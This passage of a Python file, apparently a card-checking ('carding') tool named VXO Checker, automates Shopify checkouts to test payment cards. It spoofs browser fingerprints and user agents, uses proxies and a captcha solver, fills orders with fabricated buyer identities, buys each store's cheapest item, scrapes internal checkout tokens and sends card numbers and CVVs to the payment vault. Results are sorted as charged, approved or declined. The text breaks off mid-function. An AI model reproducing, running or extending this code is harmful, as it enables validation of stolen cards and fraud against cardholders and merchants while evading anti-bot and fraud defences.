import json
import os
"""
VXO Checker — Shopify Checkout Engine
"""
import random
import re
import time
import html
import urllib.parse
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import threading

from curl_cffi.requests import Session
import logging

from captcha_solver import (
    solve as solve_captcha,
    extract_sitekey,
    probe_sitekey,
    DEFAULT_UA as CAPTCHA_DEFAULT_UA,
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("vxo")

CAPTCHA_ENABLED = os.environ.get("CAPTCHA_ENABLED", "1") not in ("0", "false", "False")
CAPTCHA_RETRIES = int(os.environ.get("CAPTCHA_RETRIES", "2"))


def _redact(s: str) -> str:
    try:
        return re.sub(r"\b(\d{6})\d{6,9}(\d{4})\b", r"\1******\2", str(s))
    except Exception:
        return str(s)


BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110",
                    "chrome107", "edge101", "safari15_5", "safari17_0"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]


class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False


@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"


COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US":     Address("james",   "anderson",   "428 W 45th St",           "Apt 4B",    "New York",      "US", "NY",  "10036",    "+12125550100", "gmail.com"),
    "US-CA":  Address("michael", "johnson",    "123 Hollywood Blvd",      "Suite 100", "Los Angeles",   "US", "CA",  "90028",    "+13235550100", "yahoo.com"),
    "US-TX":  Address("robert",  "williams",   "456 Main St",             "",          "Houston",       "US", "TX",  "77002",    "+17135550100", "outlook.com"),
    "US-FL":  Address("david",   "brown",      "789 Ocean Dr",            "Apt 12",    "Miami",         "US", "FL",  "33139",    "+13055550100", "hotmail.com"),
    "CA":     Address("john",    "smith",      "200 Kent St",             "",          "Ottawa",        "CA", "ON",  "K1A 0G9",  "+16135550100", "gmail.com"),
    "CA-BC":  Address("william", "davis",      "789 Granville St",        "Floor 5",   "Vancouver",     "CA", "BC",  "V6Z 1K9",  "+16045550100", "gmail.com"),
    "GB":     Address("james",   "wilson",     "10 Downing St",           "",          "London",        "GB", "ENG", "SW1A 2AA", "+442012345678", "gmail.com"),
    "GB-MAN": Address("oliver",  "martinez",   "123 Deansgate",           "Apt 3B",    "Manchester",    "GB", "ENG", "M3 4BQ",   "+441619876543", "outlook.com"),
    "AU":     Address("thomas",  "taylor",     "1 George St",             "",          "Sydney",        "AU", "NSW", "2000",     "+61212345678",  "gmail.com"),
    "AU-MEL": Address("daniel",  "anderson",   "100 Collins St",          "Level 10",  "Melbourne",     "AU", "VIC", "3000",     "+61398765432",  "yahoo.com"),
    "DE":     Address("lucas",   "thomas",     "Friedrichstr 100",        "",          "Berlin",        "DE", "BE",  "10117",    "+493012345678", "gmail.com"),
    "DE-MUC": Address("felix",   "schmidt",    "Marienplatz 1",           "",          "Munich",        "DE", "BY",  "80331",    "+49891234567",  "gmail.com"),
    "FR":     Address("hugo",    "bernard",    "10 Rue de Rivoli",        "",          "Paris",         "FR", "IDF", "75001",    "+33112345678",  "gmail.com"),
    "FR-LY":  Address("louis",   "petit",      "15 Rue de la République", "",          "Lyon",          "FR", "ARA", "69001",    "+33487654321",  "outlook.com"),
    "NZ":     Address("jack",    "wilson",     "1 Queen St",              "",          "Auckland",      "NZ", "AUK", "1010",     "+6491234567",   "gmail.com"),
    "NZ-WLG": Address("liam",    "brown",      "100 Willis St",           "Floor 2",   "Wellington",    "NZ", "WGN", "6011",     "+6449876543",   "gmail.com"),
    "IE":     Address("sean",    "murphy",     "1 Grafton St",            "",          "Dublin",        "IE", "D",   "D02 Y006", "+35311234567",  "gmail.com"),
    "IE-CORK":Address("patrick", "kelly",      "100 Patrick St",          "",          "Cork",          "IE", "CO",  "T12 XY88", "+35321456789",  "gmail.com"),
    "NL":     Address("bas",     "jansen",     "Dam 1",                   "",          "Amsterdam",     "NL", "NH",  "1012 JS",  "+31201234567",  "gmail.com"),
    "ES":     Address("carlos",  "garcia",     "Calle Mayor 1",           "",          "Madrid",        "ES", "M",   "28013",    "+34912345678",  "gmail.com"),
    "IT":     Address("marco",   "rossi",      "Via Roma 1",              "",          "Rome",          "IT", "RM",  "00184",    "+39061234567",  "gmail.com"),
    "SE":     Address("erik",    "andersson",  "Vasagatan 1",             "",          "Stockholm",     "SE", "AB",  "111 20",   "+468123456",    "gmail.com"),
    "NO":     Address("olav",    "hansen",     "Karl Johans gate 1",      "",          "Oslo",          "NO", "03",  "0154",     "+4721234567",   "gmail.com"),
    "DK":     Address("lars",    "nielsen",    "Strøget 1",               "",          "Copenhagen",    "DK", "84",  "1457",     "+4531234567",   "gmail.com"),
    "FI":     Address("jussi",   "korhonen",   "Mannerheimintie 1",       "",          "Helsinki",      "FI", "18",  "00100",    "+35891234567",  "gmail.com"),
    "BE":     Address("jan",     "peeters",    "Grote Markt 1",           "",          "Brussels",      "BE", "BRU", "1000",     "+3221234567",   "gmail.com"),
    "CH":     Address("hans",    "weber",      "Bahnhofstrasse 1",        "",          "Zurich",        "CH", "ZH",  "8001",     "+41441234567",  "gmail.com"),
    "AT":     Address("markus",  "gruber",     "Stephansplatz 1",         "",          "Vienna",        "AT", "9",   "1010",     "+4312345678",   "gmail.com"),
    "JP":     Address("takashi", "yamamoto",   "1-1-1 Marunouchi",        "",          "Tokyo",         "JP", "13",  "100-0005", "+81312345678",  "gmail.com"),
    "SG":     Address("wei",     "tan",        "1 Raffles Place",         "#01-01",    "Singapore",     "SG", "01",  "048616",   "+6561234567",   "gmail.com"),
    "AE":     Address("ahmed",   "al-mansouri","Sheikh Zayed Road 1",     "",          "Dubai",         "AE", "DU",  "12345",    "+97141234567",  "gmail.com"),
}

SHIPPING_FALLBACK_ORDER = ["CA", "GB", "AU", "DE", "FR", "NL", "IE", "SE", "NO", "DK"]

EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","yandex.com","proton.me"]
FIRST_NAMES   = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles","mary","patricia","jennifer","linda","elizabeth","barbara","susan","jessica","sarah","karen"]
LAST_NAMES    = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez","anderson","taylor","thomas","moore","jackson","martin","lee","white","harris","clark"]


def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"


def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    if base in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[base]
    return COUNTRY_ADDRESSES["US"]


def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(COUNTRY_ADDRESSES[code])
    return result


class TLSClient:
    def __init__(self, timeout=15, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout   = timeout
        self.proxy_url = proxy_url or ""
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent  = user_agent
        _kw = {"impersonate": impersonate, "timeout": timeout}
        if self.proxy_url:
            _kw["proxy"] = self.proxy_url
        self.session = Session(**_kw)
        self.session.headers.update({
            'User-Agent':                user_agent,
            'Accept-Language':           'en-US,en;q=0.9',
            'Accept-Encoding':           'gzip, deflate, br',
            'Accept':                    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection':                'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':            'document',
            'Sec-Fetch-Mode':            'navigate',
            'Sec-Fetch-Site':            'none',
            'Sec-Fetch-User':            '?1',
            'Cache-Control':             'max-age=0',
        })

    def get(self, url, **kw):
        kw.setdefault('timeout', self.timeout)
        return self.session.get(url, **kw)

    def post(self, url, data=None, json=None, **kw):
        kw.setdefault('timeout', self.timeout)
        return self.session.post(url, data=data, json=json, **kw)

    def close(self):
        self.session.close()

    def __enter__(self): return self
    def __exit__(self, *args): self.close()


_recent_prices: Dict[str, List[str]] = {}
_recent_prices_lock = threading.Lock()


def _shuffle_pick_variant(candidates: List[Dict], domain: str) -> Dict:
    if len(candidates) <= 1:
        return candidates[0]
    with _recent_prices_lock:
        recent    = _recent_prices.get(domain, [])
        preferred = [v for v in candidates if v["price"] not in recent]
        pick      = random.choice(preferred) if preferred else random.choice(candidates)
        _recent_prices[domain] = (list(recent) + [pick["price"]])[-5:]
    return pick


def find_cheapest_product(client: TLSClient, shop_url: str,
                          min_price: float = 0.10,
                          max_price: float = 7.00) -> Tuple[str, str, str, str]:
    domain = urllib.parse.urlparse(shop_url).hostname or shop_url
    url = f"{shop_url}/products.json?limit=250"
    _RETRYABLE = {400, 429, 500, 502, 503, 504}
    resp = None
    last_err = None
    for attempt in range(1, 6):
        try:
            resp = client.get(url)
        except Exception as exc:
            last_err = exc
            time.sleep(2 + random.random())
            continue
        if resp.status_code == 200:
            break
        if resp.status_code in _RETRYABLE:
            wait = 2 ** attempt
            if resp.status_code == 429:
                ra = resp.headers.get("Retry-After")
                if ra:
                    try: wait = min(float(ra), 30)
                    except Exception: pass
            if attempt < 5:
                time.sleep(wait + random.random())
            continue
        raise Exception(f"products.json returned {resp.status_code}")
    else:
        raise Exception(f"products.json failed after 5 attempts: {last_err}")

    if resp is None or resp.status_code != 200:
        raise Exception(f"products.json unavailable: {last_err}")
    products = resp.json().get("products", [])
    if not products:
        raise Exception("No products returned from store")
    in_range, fallback = [], []
    for p in products:
        for v in p.get("variants", []):
            if v.get("available") is False: continue
            if v.get("inventory_quantity") is not None and v["inventory_quantity"] <= 0: continue
            try: price_f = float(v.get("price") or 0)
            except (ValueError, TypeError): continue
            if price_f < min_price: continue
            entry = {"variant_id": str(v["id"]), "product_id": str(p["id"]),
                     "title": p.get("title", ""), "price": v.get("price", ""),
                     "price_f": price_f}
            if price_f <= max_price: in_range.append(entry)
            fallback.append(entry)
    fallback.sort(key=lambda x: x["price_f"])
    candidates = in_range if in_range else fallback
    if not candidates:
        raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")
    pick = _shuffle_pick_variant(candidates, domain)
    return pick["title"], pick["product_id"], pick["variant_id"], pick["price"]


def add_to_cart_and_checkout(client, shop_url, variant_id):
    checkout_resp = client.get(f"{shop_url}/cart/{variant_id}:1",
        allow_redirects=True, headers={
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
            "cache-control": "no-cache", "pragma": "no-cache",
            "referer": shop_url + "/",
            "sec-ch-ua": '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
            "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin", "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1"})
    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")
    checkout_url  = checkout_resp.url
    checkout_html = checkout_resp.text
    tok = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = tok.group(1) if tok else ""
    ss = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token = html.unescape(ss.group(1)).strip('"') if ss else ""
    return checkout_url, checkout_token, session_token, checkout_html


def extract_private_access_token_id(h):
    m = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', html.unescape(h))
    return m.group(1) if m else ""


def fetch_private_access_token(client, shop_url, checkout_url, pat_id):
    url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    resp = client.get(url, headers={
        "accept": "*/*", "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin"})
    return f"[{resp.status_code}] {resp.text}"


def extract_actions_js_url(checkout_html, shop_url):
    m = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    return shop_url + m.group(1) if m else ""


def fetch_actions_js(client, actions_url, shop_url):
    resp = client.get(actions_url, headers={
        "accept": "*/*", "accept-language": "en-US,en;q=0.9",
        "origin": shop_url, "priority": "u=1",
        "sec-fetch-dest": "script", "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin"})
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text


def extract_proposal_id(js):
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js)
    return m.group(1) if m else ""


def extract_submit_for_completion_id(js):
    m = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js)
    return m.group(1) if m else ""


def extract_poll_for_receipt_id(js):
    for p in [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
    ]:
        m = re.search(p, js)
        if m: return m.group(1)
    return ""


_CHECKOUT_JS_RE = re.compile(
    r'(?:https?:)?//[^"\']*shopifycloud/checkout-web/assets/[^"\']*\.js'
    r'|/cdn/shopifycloud/checkout-web/assets/[^"\']*\.js'
)


def _collect_checkout_js_urls(checkout_html, shop_url):
    urls, seen = [], set()
    for m in _CHECKOUT_JS_RE.finditer(checkout_html or ""):
        path = m.group(0)
        if path.startswith("//"):
            path = "https:" + path
        elif path.startswith("/"):
            path = shop_url + path
        if path not in seen:
            seen.add(path); urls.append(path)
    return urls


def _collect_preloads_js_urls(preloads_body, shop_url):
    urls, seen = [], set()
    for m in _CHECKOUT_JS_RE.finditer(preloads_body or ""):
        path = m.group(0)
        if path.startswith("//"):
            path = "https:" + path
        elif path.startswith("/"):
            path = shop_url + path
        if path not in seen:
            seen.add(path); urls.append(path)
    return urls


def _fetch_preloads_body(client, shop_url, checkout_url):
    try:
        url = f"{shop_url}/checkouts/internal/preloads.js"
        resp = client.get(url, headers={
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "referer": checkout_url,
            "sec-fetch-dest": "script",
            "sec-fetch-mode": "no-cors",
            "sec-fetch-site": "same-origin",
        })
        if resp.status_code == 200:
            logger.info(f"preloads.js fetched ({len(resp.text)} bytes)")
            return resp.text
        logger.info(f"preloads.js HTTP {resp.status_code}")
    except Exception as e:
        logger.warning(f"preloads.js fetch failed: {e}")
    return ""


def discover_operation_ids(client, shop_url, checkout_html,
                           checkout_url="", checkout_token=""):
    proposal_id = extract_proposal_id(checkout_html)
    submit_id   = extract_submit_for_completion_id(checkout_html)
    poll_id     = extract_poll_for_receipt_id(checkout_html)

    if proposal_id and submit_id:
        logger.info("op ids found in checkout HTML")
        return proposal_id, submit_id, poll_id

    # Pass 1: JS bundles referenced in checkout HTML
    js_urls = _collect_checkout_js_urls(checkout_html, shop_url)
    logger.info(f"scanning {len(js_urls)} checkout HTML JS bundles for op ids")

    for url in js_urls:
        if proposal_id and submit_id and poll_id: break
        try:
            resp = client.get(url, headers={"accept": "*/*", "referer": shop_url + "/"})
            if resp.status_code != 200: continue
            body = resp.text
        except Exception:
            continue
        if not proposal_id: proposal_id = extract_proposal_id(body)
        if not submit_id:   submit_id   = extract_submit_for_completion_id(body)
        if not poll_id:     poll_id     = extract_poll_for_receipt_id(body)

    if proposal_id and submit_id:
        logger.info("op ids found in checkout HTML JS bundles")
        return proposal_id, submit_id, poll_id

    # Pass 2: preloads.js (current Shopify architecture)
    preloads_body = ""
    if checkout_url:
        preloads_body = _fetch_preloads_body(client, shop_url, checkout_url)

    if preloads_body:
        if not proposal_id: proposal_id = extract_proposal_id(preloads_body)
        if not submit_id:   submit_id   = extract_submit_for_completion_id(preloads_body)
        if not poll_id:     poll_id     = extract_poll_for_receipt_id(preloads_body)

        preloads_js_urls = _collect_preloads_js_urls(preloads_body, shop_url)
        logger.info(f"scanning {len(preloads_js_urls)} preloads.js JS bundles for op ids")

        for url in preloads_js_urls:
            if proposal_id and submit_id and poll_id: break
            try:
                resp = client.get(url, headers={"accept": "*/*", "referer": shop_url + "/"})
                if resp.status_code != 200: continue
                body = resp.text
            except Exception:
                continue
            if not proposal_id: proposal_id = extract_proposal_id(body)
            if not submit_id:   submit_id   = extract_submit_for_completion_id(body)
            if not poll_id:     poll_id     = extract_poll_for_receipt_id(body)

    return proposal_id, submit_id, poll_id


def extract_queue_token(j):
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', j)
    return m.group(1) if m else ""


def _track_checkpoint(body, current, step):
    try:
        d = json.loads(body)
        ck = (d.get("data", {}).get("session", {}).get("negotiate", {})
                .get("result", {}).get("checkpointData", ""))
        if ck and ck != current:
            logger.info(f"{step}: checkpointData captured ({len(ck)} chars)")
            return ck
    except Exception:
        pass
    m = re.search(r'"checkpointData"\s*:\s*"([^"]+)"', body)
    if m and m.group(1) != current:
        return m.group(1)
    return current


def extract_checkpoint_data(b):
    try:
        d = json.loads(b)
        ck = (d.get("data", {}).get("session", {}).get("negotiate", {})
                .get("result", {}).get("checkpointData", ""))
        if ck: return ck
    except Exception:
        pass
    m = re.search(r'"checkpointData"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def extract_is_shipping_required(j):
    try:
        d = json.loads(j)
        return (d.get("data", {}).get("session", {}).get("negotiate", {})
                  .get("result", {}).get("sellerProposal", {}).get("isShippingRequired", True))
    except Exception: return True


def extract_stable_id(h):
    m = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"',
                  html.unescape(h))
    return m.group(1) if m else ""


def extract_commit_sha(h):
    m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', html.unescape(h))
    return m.group(1) if m else ""


def extract_source_token(h):
    m = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', h)
    return html.unescape(m.group(1)).strip('"') if m else ""


def extract_identification_signature(h):
    u = h.replace('&quot;', '"')
    for p in [r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
              r'CardsinkCallerIdentificationSignature":"([^"]+)"',
              r'cardsinkCallerIdentificationSignature":"([^"]+)"',
              r'"identification_signature"\s*:\s*"([^"]+)"']:
        m = re.search(p, u)
        if m: return m.group(1)
    return ""


def extract_vault_url(h):
    d = h.replace('&quot;', '"')
    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', d)
    if m: return m.group(1)
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', d)
    if hf: return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""


def extract_vault_domain(h):
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', h.replace('&quot;', '"'))
    return m.group(1) if m else ""


def extract_pci_session_id(b):
    m = re.search(r'"id"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def extract_delivery_handle(b):
    try:
        d = json.loads(b)
        seller = (d.get("data", {}).get("session", {}).get("negotiate", {})
                    .get("result", {}).get("sellerProposal", {}))
        dlv = seller.get("delivery", {})
        h = dlv.get("selectedDeliveryStrategy", {}).get("handle", "")
        if h: return h
        h = dlv.get("deliveryStrategyHandle", "")
        if h: return h
        for line in dlv.get("deliveryLines", []):
            for macro in line.get("deliveryMacros", []):
                handles = macro.get("deliveryStrategyHandles", [])
                if handles: return handles[0]
    except Exception: pass
    for p in [r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
              r'"deliveryStrategyHandle"\s*:\s*"([^"]+)"',
              r'"handle"\s*:\s*"([a-f0-9\-]{20,})"']:
        m = re.search(p, b)
        if m: return m.group(1)
    return ""


def extract_signed_handles(j):
    try:
        d = json.loads(j)
        seller = (d.get("data", {}).get("session", {}).get("negotiate", {})
                    .get("result", {}).get("sellerProposal", {}))
        de = seller.get("deliveryExpectations", {})
        de_type = de.get("__typename", "")
        if de_type == "FilledDeliveryExpectationTerms":
            h = [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]
            if h: return h
            h = [x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                 for x in de.get("deliveryExpectations", [])
                 if x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
            if h: return h
        dlv = seller.get("delivery", {})
        if dlv.get("__typename") == "FilledDeliveryTerms" or de_type == "FilledDeliveryTerms":
            return []
        if "deliveryExpectations" in de:
            exp = de.get("deliveryExpectations", [])
            if isinstance(exp, list):
                h = [x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")
                     for x in exp
                     if x.get("signedHandle") or x.get("deliveryOptionHandle") or x.get("deliveryStrategyHandle")]
                if h: return h
        if de_type in ["UnfilledDeliveryExpectationTerms", "UnavailableTerms", "PendingTerms"]:
            return []
    except Exception: pass
    return []


def extract_shipping_amount(b):
    m = re.search(r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def extract_checkout_total(b):
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def extract_seller_total(b):
    m = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def extract_running_total(j):
    try:
        d = json.loads(j)
        return (d.get("data", {}).get("session", {}).get("negotiate", {})
                  .get("result", {}).get("sellerProposal", {})
                  .get("runningTotal", {}).get("value", {}).get("amount", ""))
    except Exception: return ""


def extract_seller_merchandise_price(b):
    m = re.search(r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def extract_seller_currency(b):
    m = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', b)
    return m.group(1) if m else ""


def extract_seller_country(b):
    m = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', b)
    return m.group(1) if m else ""


def extract_tax_amount(j):
    try:
        d = json.loads(j)
        return (d.get("data", {}).get("session", {}).get("negotiate", {})
                  .get("result", {}).get("sellerProposal", {})
                  .get("tax", {}).get("totalTaxAmount", {}).get("value", {})
                  .get("amount", "0.0"))
    except Exception: return "0.0"


def extract_tax_from_rejected(j):
    try:
        d = json.loads(j)
        return (d.get("data", {}).get("submitForCompletion", {})
                  .get("sellerProposal", {}).get("tax", {}).get("totalTaxAmount", {})
                  .get("value", {}).get("amount", "0.0"))
    except Exception: return "0.0"


def extract_total_from_rejected(j):
    try:
        d = json.loads(j)
        seller = (d.get("data", {}).get("submitForCompletion", {}).get("sellerProposal", {}))
        for k in ("checkoutTotal", "total", "runningTotal"):
            v = seller.get(k, {}).get("value", {}).get("amount")
            if v: return v
        return ""
    except Exception: return ""


def extract_receipt_id(b):
    m = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', b)
    return m.group(1) if m else ""


def extract_receipt_session_token(b):
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


_SHOPIFY_ERROR_MAP = {
    "risky":"RISK_REJECTED","risk":"RISK_REJECTED","fraud":"RISK_REJECTED",
    "suspected fraud":"RISK_REJECTED",
    "do not honor":"DO_NOT_HONOR","do_not_honor":"DO_NOT_HONOR",
    "insufficient funds":"INSUFFICIENT_FUNDS","insufficient_funds":"INSUFFICIENT_FUNDS",
    "card declined":"CARD_DECLINED","card_declined":"CARD_DECLINED",
    "invalid card":"CARD_INVALID","invalid_card":"CARD_INVALID",
    "expired card":"CARD_EXPIRED","card expired":"CARD_EXPIRED",
    "incorrect cvc":"CVV_INVALID","incorrect_cvc":"CVV_INVALID",
    "security code":"CVV_INVALID",
    "stolen card":"CARD_STOLEN","lost card":"CARD_STOLEN","pickup card":"CARD_STOLEN",
    "address":"ADDRESS_INVALID","zip":"ZIP_INVALID","postal":"ZIP_INVALID",
    "throttled":"RATE_LIMITED","too many":"RATE_LIMITED","rate limit":"RATE_LIMITED",
    "gateway":"GATEWAY_ERROR","processing error":"GATEWAY_ERROR",
    "inventory":"OUT_OF_STOCK","out of stock":"OUT_OF_STOCK","unavailable":"OUT_OF_STOCK",
    "captcha":"CAPTCHA_REQUIRED","terms":"TERMS_REQUIRED",
    "payment method":"PAYMENT_METHOD_INVALID",
}


def _map_error(raw):
    low = raw.lower()
    for k, c in _SHOPIFY_ERROR_MAP.items():
        if k in low: return c
    return raw.upper().replace(" ", "_")[:40]


def extract_any_error(b):
    for p in [r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
              r'"localizedMessage"\s*:\s*"([^"]+)"',
              r'"code"\s*:\s*"([^"]+)"',
              r'"message"\s*:\s*"([^"]+)"']:
        m = re.search(p, b)
        if m: return _map_error(m.group(1))
    return ""


def extract_receipt_status_code(poll_body, receipt_type):
    if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
        return "ORDER_PLACED"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    m = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
    if m:
        c = m.group(1)
        if "CAPTCHA" in c: return "CAPTCHA_REQUIRED"
        return c
    if "CAPTCHA" in poll_body: return "CAPTCHA_REQUIRED"
    if receipt_type == "FailedReceipt": return "FAILED"
    return "UNKNOWN"


def detect_shipping_restriction(b):
    signals = ["SHIPPING_ADDRESS_UNDELIVERABLE", "no_delivery_options_available",
               "noDeliveryOptionsAvailable", "delivery is not available", "does not ship to"]
    low = b.lower()
    return any(s.lower() in low for s in signals)


def patch_payload(payload, currency, country):
    if currency == "USD" and country == "US":
        return payload
    try:
        data = json.loads(payload)
    except json.JSONDecodeError:
        if currency != "USD":
            payload = payload.replace('"currencyCode":"USD"', f'"currencyCode":"{currency}"')
            payload = payload.replace('"presentmentCurrency":"USD"', f'"presentmentCurrency":"{currency}"')
        if country != "US":
            payload = payload.replace('"phoneCountryCode":"US"', f'"phoneCountryCode":"{country}"')
        return payload
    _in_buyer = [False]
    def _walk(o):
        if isinstance(o, dict):
            out = {}
            for k, v in o.items():
                if k == "presentmentCurrency" and v == "USD" and currency != "USD":
                    out[k] = currency
                elif k == "phoneCountryCode" and v == "US" and country != "US":
                    out[k] = country
                elif k == "countryCode" and v == "US" and country != "US" and _in_buyer[0]:
                    out[k] = country
                elif k == "customer":
                    _in_buyer[0] = True
                    out[k] = _walk(v)
                    _in_buyer[0] = False
                else:
                    out[k] = _walk(v)
            return out
        if isinstance(o, list):
            return [_walk(i) for i in o]
        return o
    return json.dumps(_walk(data), separators=(",", ":"))


def generate_attempt_token(ct):
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{ct}-{''.join(random.choice(chars) for _ in range(10))}"


def generate_page_id():
    return f"{random.getrandbits(64):016x}"


def send_pci_session(ident_sig, card_number, card_name, card_month, card_year, cvv,
                     shop_domain, proxy_url="", vault_url="", vault_domain="",
                     impersonate="chrome124"):
    DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
    endpoint    = vault_url or DEFAULT_VAULT
    scope       = vault_domain or shop_domain
    origin_base = endpoint.rsplit("/sessions", 1)[0] if "/sessions" in endpoint else "https://checkout.pci.shopifyinc.com"
    payload = json.dumps({
        "credit_card": {
            "number": card_number, "month": card_month, "year": card_year,
            "verification_value": cvv, "start_month": None, "start_year": None,
            "issue_number": "", "name": card_name,
        },
        "payment_session_scope": scope,
    })
    headers = {
        "accept": "application/json", "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json", "origin": origin_base,
        "priority": "u=1, i",
